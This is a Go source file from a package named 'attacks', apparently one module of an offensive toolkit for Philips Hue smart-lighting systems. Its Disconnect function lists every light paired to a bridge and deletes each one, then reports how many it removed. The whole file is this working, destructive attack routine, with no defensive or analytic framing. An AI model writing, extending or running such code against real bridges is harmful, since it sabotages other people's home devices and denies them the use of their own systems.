package attacks

import (
	"context"
	"fmt"
	"github.com/amimof/huego"
	"log"
)

func Disconnect(ctx context.Context, bridge *huego.Bridge) error {
	lights, err := bridge.GetLightsContext(ctx)
	if err != nil {
		return fmt.Errorf("error getting lights: %w", err)
	}
	fmt.Printf("Found %d lights\n", len(lights))

	errorCount := 0
	disconnectedCount := 0

	log.Println("Trying to disconnect lights from Philips Hue Bridge...")
	for _, light := range lights {
		err := bridge.DeleteLightContext(ctx, light.ID)
		if err != nil {
			errorCount++
		} else {
			disconnectedCount++
		}
	}

	if disconnectedCount > 0 {
		log.Printf("Disconnected %d lights from Philips Hue Bridge\n", disconnectedCount)
	}
	if errorCount > 0 {
		log.Printf("Failed to disconnect %d lights from Philips Hue Bridge\n", errorCount)
		return fmt.Errorf("failed to disconnect %d lights from Philips Hue Bridge", errorCount)
	}

	return nil
}
